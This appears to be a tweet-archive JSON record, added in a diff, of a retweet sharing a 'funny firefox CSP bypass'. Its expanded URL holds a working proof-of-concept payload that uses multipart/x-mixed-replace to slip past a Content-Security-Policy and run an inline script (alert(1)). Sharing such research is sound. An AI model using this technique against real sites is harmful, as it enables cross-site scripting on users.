@@ -1,0 +1,143 @@
+{
+  "tweet": {
+    "edit_info": {
+      "initial": {
+        "editTweetIds": [
+          "1724155391557415013"
+        ],
+        "editableUntil": "2023-11-13T21:00:53.262Z",
+        "editsRemaining": "5",
+        "isEditEligible": false
+      }
+    },
+    "retweeted": false,
+    "source": "<a href=\"http://twitter.com/download/iphone\" rel=\"nofollow\">Twitter for iPhone</a>",
+    "entities": {
+      "user_mentions": [
+        {
+          "name": "arxenix",
+          "screen_name": "ankursundara",
+          "indices": [
+            "3",
+            "16"
+          ],
+          "id_str": "1489497043",
+          "id": "1489497043"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://t.co/D7K2oYlxFM",
+          "expanded_url": "https://terjanq.me/xss.php?h[Content-Security-Policy]=default-src%20%27none%27&h[Content-Type]=multipart/x-mixed-replace;%20boundary=MYBOUNDARY&html=--MYBOUNDARY%0AContent-Type:%20text/html%0AContent-Security-Policy:%20script-src%20%27unsafe-inline%27%0A%0Alol%3Cscript%3Ealert(1)%3C/script%3E%0A--MYBOUNDARY--",
+          "display_url": "terjanq.me/xss.php?h[Cont…",
+          "indices": [
+            "44",
+            "67"
+          ]
+        }
+      ],
+      "symbols": [],
+      "media": [
+        {
+          "expanded_url": "https://twitter.com/ankursundara/status/1723410507389129092/photo/1",
+          "source_status_id": "1723410507389129092",
+          "indices": [
+            "68",
+            "91"
+          ],
+          "url": "https://t.co/LmZhA85vzG",
+          "media_url": "http://pbs.twimg.com/media/F-rIi1_bYAAhmrJ.jpg",
+          "id_str": "1723410308356857856",
+          "source_user_id": "1489497043",
+          "id": "1723410308356857856",
+          "media_url_https": "https://pbs.twimg.com/media/F-rIi1_bYAAhmrJ.jpg",
+          "source_user_id_str": "1489497043",
+          "sizes": {
+            "thumb": {
+              "w": "150",
+              "h": "150",
+              "resize": "crop"
+            },
+            "medium": {
+              "w": "1200",
+              "h": "818",
+              "resize": "fit"
+            },
+            "small": {
+              "w": "680",
+              "h": "463",
+              "resize": "fit"
+            },
+            "large": {
+              "w": "1312",
+              "h": "894",
+              "resize": "fit"
+            }
+          },
+          "type": "photo",
+          "source_status_id_str": "1723410507389129092",
+          "display_url": "pic.twitter.com/LmZhA85vzG"
+        }
+      ],
+      "hashtags": []
+    },
+    "display_text_range": [
+      "0",
+      "91"
+    ],
+    "favorite_count": "0",
+    "id_str": "1724155391557415013",
+    "truncated": false,
+    "retweet_count": "0",
+    "id": "1724155391557415013",
+    "possibly_sensitive": false,
+    "created_at": "Mon Nov 13 20:00:53 +0000 2023",
+    "favorited": false,
+    "full_text": "RT @ankursundara: funny firefox CSP bypass\n\nhttps://t.co/D7K2oYlxFM https://t.co/LmZhA85vzG",
+    "lang": "en",
+    "extended_entities": {
+      "media": [
+        {
+          "expanded_url": "https://twitter.com/ankursundara/status/1723410507389129092/photo/1",
+          "source_status_id": "1723410507389129092",
+          "indices": [
+            "68",
+            "91"
+          ],
+          "url": "https://t.co/LmZhA85vzG",
+          "media_url": "http://pbs.twimg.com/media/F-rIi1_bYAAhmrJ.jpg",
+          "id_str": "1723410308356857856",
+          "source_user_id": "1489497043",
+          "id": "1723410308356857856",
+          "media_url_https": "https://pbs.twimg.com/media/F-rIi1_bYAAhmrJ.jpg",
+          "source_user_id_str": "1489497043",
+          "sizes": {
+            "thumb": {
+              "w": "150",
+              "h": "150",
+              "resize": "crop"
+            },
+            "medium": {
+              "w": "1200",
+              "h": "818",
+              "resize": "fit"
+            },
+            "small": {
+              "w": "680",
+              "h": "463",
+              "resize": "fit"
+            },
+            "large": {
+              "w": "1312",
+              "h": "894",
+              "resize": "fit"
+            }
+          },
+          "type": "photo",
+          "source_status_id_str": "1723410507389129092",
+          "display_url": "pic.twitter.com/LmZhA85vzG"
+        }
+      ]
+    }
+  }
+}
